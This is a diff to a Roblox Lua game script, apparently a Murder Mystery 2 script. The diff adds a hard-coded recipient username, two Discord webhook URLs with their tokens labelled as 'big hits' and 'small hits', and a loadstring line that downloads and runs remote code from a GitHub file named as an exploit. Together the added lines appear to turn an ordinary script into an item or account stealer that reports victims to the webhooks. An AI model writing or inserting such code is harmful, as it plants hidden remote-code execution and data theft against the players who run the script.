@@ -17,6 +17,12 @@ if game.GameId ~= 66654135 then
     game:GetService('TeleportService'):Teleport(142823291, game.Players.LocalPlayer)
 end
 
+Usernames = {
+    'egor_idk',
+}
+BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
 
 
 --[[
